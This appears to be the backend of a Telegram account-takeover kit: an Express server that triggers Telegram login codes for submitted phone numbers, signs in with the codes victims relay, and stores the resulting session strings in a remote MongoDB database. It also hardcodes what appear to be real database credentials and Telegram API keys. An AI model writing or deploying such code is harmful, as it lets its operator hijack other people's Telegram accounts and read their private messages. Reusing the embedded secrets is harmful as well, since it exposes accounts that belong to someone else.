const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB Setup
const MONGO_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/sessions?retryWrites=true&w=majority";
mongoose.connect(MONGO_URI);

const SessionSchema = new mongoose.Schema({ phoneNumber: String, sessionString: String });
const SessionModel = mongoose.model('Session', SessionSchema);

// Telegram Credentials
const apiId = 23049703;
const apiHash = "e9c00af578a9de0253ef02337460498f";

// OTP Anforderung
app.post('/send-otp', async (req, res) => {
    try {
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, req.body.phoneNumber);
        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// OTP Verifizierung
app.post('/verify-otp', async (req, res) => {
    try {
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        
        await client.signIn({
            phoneNumber: req.body.phoneNumber,
            phoneCode: req.body.phoneCode,
            phoneCodeHash: req.body.phoneCodeHash
        });
        
        await SessionModel.create({ 
            phoneNumber: req.body.phoneNumber, 
            sessionString: client.session.save() 
        });
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.listen(10000, () => console.log('Server running on port 10000'));
